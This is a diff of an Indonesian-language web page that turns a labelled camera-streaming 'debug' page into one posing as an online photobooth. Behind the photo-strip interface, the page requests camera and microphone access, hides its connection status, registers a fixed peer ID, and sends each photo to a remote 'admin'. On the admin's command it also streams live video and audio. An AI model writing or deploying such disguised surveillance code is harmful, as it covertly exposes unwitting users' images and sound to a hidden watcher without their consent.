@@ -2,99 +2,261 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Halaman Pengguna - (Debug)</title>
-    <style>
-        body { font-family: sans-serif; padding: 20px; background-color: #f4f4f9; }
-        h1 { color: #333; }
-        #container { max-width: 640px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        video { width: 100%; border: 1px solid #ccc; background-color: #000; }
-        #status, #lokasi { margin-top: 15px; font-weight: bold; }
-        #status.connected { color: #28a745; }
-        #status.waiting { color: #dc3545; }
-    </style>
+    <title>Photobooth Online</title>
+    <!-- 1. Impor Tailwind CSS via CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- 2. Impor PeerJS -->
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-</head>
-<body>
+    <!-- Impor Ikon (opsional, untuk tombol kamera) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
 
-    <div id="container">
-        <h1>Halaman Pengguna</h1>
-        <p>Akan mengirimkan data saat halaman admin dibuka.</p>
+    <style>
+        /* Menambahkan font kustom yang lebih menarik */
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
+        body {
+            font-family: 'Poppins', sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-slate-100 flex items-center justify-center min-h-screen p-4">
+
+    <!-- Canvas tersembunyi untuk menangkap frame individu -->
+    <canvas id="capture-canvas" class="hidden"></canvas>
+    <!-- Canvas tersembunyi untuk menggabungkan hasil akhir photostrip -->
+    <canvas id="result-canvas" class="hidden"></canvas>
+
+    <!-- Kontainer Utama Aplikasi -->
+    <div class="w-full max-w-6xl bg-white rounded-2xl shadow-2xl p-6 md:p-8 mx-auto flex flex-col md:flex-row gap-8">
+
+        <!-- Kolom Kiri: Hasil Photo Strip -->
+        <div class="w-full md:w-[280px] flex-shrink-0">
+            <h2 class="text-xl font-bold text-slate-700 mb-4 text-center md:text-left">Hasil Foto</h2>
+            <div id="photostrip-preview" class="bg-slate-800 rounded-lg p-3 space-y-3 shadow-inner">
+                <!-- Placeholder untuk 4 foto -->
+                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 1</div>
+                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 2</div>
+                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 3</div>
+                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 4</div>
+            </div>
+        </div>
+
+        <!-- Kolom Kanan: Kamera dan Kontrol -->
+        <div class="flex-grow flex flex-col">
+            <h1 class="text-2xl md:text-3xl font-bold text-slate-800 text-center">Photo Booth Online</h1>
+            <p class="text-slate-500 text-center mb-4">Ambil 4 foto untuk membuat photo strip Anda!</p>
+
+            <!-- Area Video -->
+            <div class="w-full aspect-video rounded-lg bg-black overflow-hidden shadow-lg relative">
+                <video id="local-video" autoplay muted playsinline class="w-full h-full object-cover"></video>
+                <!-- Indikator Hitung Mundur -->
+                <div id="countdown-overlay" class="absolute inset-0 bg-black bg-opacity-50 text-white text-9xl font-bold flex items-center justify-center hidden">3</div>
+            </div>
+
+            <!-- Area Kontrol -->
+            <div class="mt-4">
+                <!-- Tombol Aksi Utama -->
+                <button id="capture-btn" class="w-full bg-pink-500 hover:bg-pink-600 text-white font-bold py-4 px-6 rounded-full text-xl transition-all duration-300 transform hover:scale-105 shadow-lg flex items-center justify-center gap-3">
+                    <i class="fas fa-camera"></i>
+                    <span id="capture-btn-text">Ambil Foto (1/4)</span>
+                </button>
+                
+                <!-- Tombol Download & Ulangi (muncul setelah selesai) -->
+                <div id="result-buttons" class="hidden grid grid-cols-2 gap-4 mt-4">
+                    <a id="download-btn" class="w-full text-center bg-pink-500 hover:bg-pink-600 text-white font-bold py-3 px-6 rounded-full text-lg transition-all shadow-lg cursor-pointer">Download</a>
+                    <button id="retake-btn" class="w-full bg-white hover:bg-slate-100 text-pink-500 font-bold py-3 px-6 rounded-full text-lg transition-all border-2 border-pink-500 shadow-lg">Ulangi</button>
+                </div>
+                
+                <!-- Kontrol UI (Placeholder seperti di gambar) -->
+                <div class="mt-6 hidden">
+                    <div>
+                        <h3 class="font-semibold text-slate-600">Warna Frame</h3>
+                        <div class="flex flex-wrap gap-3 mt-2">
+                            <button class="w-8 h-8 rounded-full bg-black border-2 border-white ring-2 ring-pink-500"></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
         
-        <video id="local-video" autoplay muted playsinline></video>
-        
-        <div id="status" class="waiting">Status: Menunggu koneksi dari admin...</div>
-        <div id="lokasi">Lokasi: Menunggu izin...</div>
+        <!-- Info koneksi disembunyikan agar UI bersih, tapi tetap berfungsi -->
+        <div id="info-container" class="hidden">
+             <div id="status"></div>
+             <div id="lokasi"></div>
+        </div>
     </div>
 
+
     <script>
-        const PREDICTABLE_PEER_ID = 'layar-utama-pengguna-kamera-v3'; // ID baru untuk menghindari cache
+        // --- PEERJS & BACKEND LOGIC ---
+        const PREDICTABLE_PEER_ID = 'layar-utama-pengguna-kamera-v3';
         const peer = new Peer(PREDICTABLE_PEER_ID);
-        
-        const localVideo = document.getElementById('local-video');
-        const statusDiv = document.getElementById('status');
-        const lokasiDiv = document.getElementById('lokasi');
-        
         let localStream;
-        let dataConnection;
+        let dataConnection; // Simpan koneksi data secara global
 
-        console.log("LOG PENGGUNA: Skrip dimulai.");
-
-        peer.on('open', (id) => {
-            console.log(`LOG PENGGUNA: Berhasil terdaftar di server PeerJS dengan ID: ${id}`);
-        });
-
-        async function start() {
+        peer.on('open', id => console.log(`PeerJS terhubung dengan ID: ${id}`));
+        peer.on('error', err => console.error('PeerJS Error: ', err));
+        
+        async function setupBackendConnection() {
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                console.log("LOG PENGGUNA: Akses kamera dan mikrofon berhasil didapatkan.");
                 localVideo.srcObject = localStream;
-
-                navigator.geolocation.watchPosition((position) => {
-                    const coords = { lat: position.coords.latitude, lon: position.coords.longitude };
-                    lokasiDiv.innerHTML = `Latitude: ${coords.lat.toFixed(5)}<br>Longitude: ${coords.lon.toFixed(5)}`;
-                    if (dataConnection && dataConnection.open) {
-                        dataConnection.send(coords);
-                    }
-                });
-
-                peer.on('connection', (conn) => {
-                    console.log(`LOG PENGGUNA: Koneksi data masuk dari ${conn.peer}`);
-                    dataConnection = conn;
-                    statusDiv.textContent = `Status: Admin terhubung!`;
-                    statusDiv.className = 'connected';
-                    
-                    conn.on('data', (data) => {
-                        console.log(`LOG PENGGUNA: Menerima data dari admin:`, data);
+                peer.on('connection', conn => {
+                    dataConnection = conn; // Simpan koneksi saat admin terhubung
+                    console.log("Admin terhubung via data connection.");
+                    conn.on('data', data => {
                         if (data.command === 'call-me') {
-                            console.log(`LOG PENGGUNA: Menerima perintah 'call-me', akan menelepon admin di ${conn.peer}`);
-                            const call = peer.call(conn.peer, localStream);
-                            
-                            // Tambahkan penanganan jika panggilan berhasil terhubung
-                            call.on('stream', () => {
-                                // Event ini sebenarnya untuk menerima stream balik, tapi bisa kita gunakan sebagai tanda koneksi berhasil
-                                console.log("LOG PENGGUNA: Panggilan video tampaknya berhasil terhubung.");
-                            });
+                            console.log("Menerima permintaan video call dari admin, menelepon kembali...");
+                            peer.call(conn.peer, localStream);
                         }
                     });
-
-                    conn.on('close', () => {
-                        console.log("LOG PENGGUNA: Koneksi data dengan admin ditutup.");
-                        statusDiv.textContent = 'Status: Koneksi dengan admin terputus.';
-                        statusDiv.className = 'waiting';
-                    });
                 });
-
             } catch (err) {
-                console.error("LOG PENGGUNA: Gagal mendapatkan akses media!", err);
-                alert('Gagal mendapatkan akses kamera atau mikrofon.');
+                alert('Gagal mendapatkan akses kamera. Harap izinkan akses untuk melanjutkan.');
+                console.error("Kesalahan akses media:", err);
             }
         }
         
-        start();
+        // --- UI & PHOTOBOOTH LOGIC ---
+        const localVideo = document.getElementById('local-video');
+        const captureCanvas = document.getElementById('capture-canvas');
+        const resultCanvas = document.getElementById('result-canvas');
+        const captureBtn = document.getElementById('capture-btn');
+        const captureBtnText = document.getElementById('capture-btn-text');
+        const photostripPreview = document.getElementById('photostrip-preview');
+        const countdownOverlay = document.getElementById('countdown-overlay');
+        const resultButtons = document.getElementById('result-buttons');
+        const downloadBtn = document.getElementById('download-btn');
+        const retakeBtn = document.getElementById('retake-btn');
 
-        peer.on('error', (err) => {
-            console.error("LOG PENGGUNA: Terjadi error pada PeerJS!", err);
+        let photos = [];
+        const MAX_PHOTOS = 4;
+
+        function updateButtonState() {
+            const photosTaken = photos.length;
+            if (photosTaken < MAX_PHOTOS) {
+                captureBtnText.textContent = `Ambil Foto (${photosTaken + 1}/${MAX_PHOTOS})`;
+                captureBtn.disabled = false;
+            } else {
+                captureBtnText.textContent = 'Selesai!';
+                captureBtn.disabled = true;
+                captureBtn.classList.add('hidden');
+                resultButtons.classList.remove('hidden');
+                // Setelah selesai, langsung generate gambar untuk di-download
+                generatePhotoStripForDownload();
+            }
+        }
+        
+        function takePhoto() {
+            if (photos.length >= MAX_PHOTOS) return;
+
+            captureBtn.disabled = true;
+            countdownOverlay.classList.remove('hidden');
+            
+            let count = 3;
+            countdownOverlay.textContent = count;
+            
+            const countdownInterval = setInterval(() => {
+                count--;
+                if (count > 0) {
+                    countdownOverlay.textContent = count;
+                } else {
+                    clearInterval(countdownInterval);
+                    countdownOverlay.textContent = '📸';
+                    
+                    // Ambil gambar
+                    const context = captureCanvas.getContext('2d');
+                    captureCanvas.width = localVideo.videoWidth;
+                    captureCanvas.height = localVideo.videoHeight;
+                    context.drawImage(localVideo, 0, 0, captureCanvas.width, captureCanvas.height);
+                    const dataUrl = captureCanvas.toDataURL('image/jpeg');
+                    const photoIndex = photos.length;
+                    photos.push(dataUrl);
+
+                    // Kirim data foto ke admin jika terhubung
+                    if (dataConnection && dataConnection.open) {
+                        console.log(`Mengirim foto ke-${photoIndex+1} ke admin.`);
+                        dataConnection.send({
+                            type: 'photo-capture',
+                            payload: {
+                                index: photoIndex,
+                                dataUrl: dataUrl
+                            }
+                        });
+                    }
+
+                    // Tampilkan di preview lokal
+                    const previewSlot = photostripPreview.children[photoIndex];
+                    previewSlot.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover rounded">`;
+                    previewSlot.classList.remove('flex', 'items-center', 'justify-center', 'text-slate-500', 'font-semibold');
+
+                    setTimeout(() => {
+                        countdownOverlay.classList.add('hidden');
+                        updateButtonState();
+                    }, 500);
+                }
+            }, 1000);
+        }
+
+        function startOver() {
+            photos = [];
+            
+            // Kirim pesan retake ke admin jika terhubung
+            if (dataConnection && dataConnection.open) {
+                console.log("Mengirim sinyal 'retake' ke admin.");
+                dataConnection.send({ type: 'retake' });
+            }
+            
+            // Reset preview UI lokal
+            for (let i = 0; i < MAX_PHOTOS; i++) {
+                const slot = photostripPreview.children[i];
+                slot.innerHTML = `Foto ${i + 1}`;
+                slot.classList.add('flex', 'items-center', 'justify-center', 'text-slate-500', 'font-semibold');
+            }
+
+            resultButtons.classList.add('hidden');
+            captureBtn.classList.remove('hidden');
+            updateButtonState();
+        }
+
+        function generatePhotoStripForDownload() {
+            const ctx = resultCanvas.getContext('2d');
+            const photoWidth = 600; // Resolusi per foto
+            const photoHeight = 450;
+            const padding = 20;
+            
+            resultCanvas.width = photoWidth + (padding * 2);
+            resultCanvas.height = (photoHeight * MAX_PHOTOS) + (padding * (MAX_PHOTOS + 1));
+            
+            ctx.fillStyle = '#1e293b'; // slate-800
+            ctx.fillRect(0, 0, resultCanvas.width, resultCanvas.height);
+
+            let imagesLoaded = 0;
+            photos.forEach((dataUrl, index) => {
+                const img = new Image();
+                img.src = dataUrl;
+                img.onload = () => {
+                    const y = (photoHeight * index) + (padding * (index + 1));
+                    ctx.drawImage(img, padding, y, photoWidth, photoHeight);
+                    imagesLoaded++;
+                    
+                    if (imagesLoaded === MAX_PHOTOS) {
+                        const finalImage = resultCanvas.toDataURL('image/png');
+                        downloadBtn.href = finalImage;
+                        downloadBtn.download = `photostrip-${Date.now()}.png`;
+                    }
+                };
+            });
+        }
+        
+        // --- Inisialisasi ---
+        captureBtn.addEventListener('click', takePhoto);
+        retakeBtn.addEventListener('click', startOver);
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            setupBackendConnection();
+            updateButtonState();
         });
+
     </script>
 </body>
 </html>
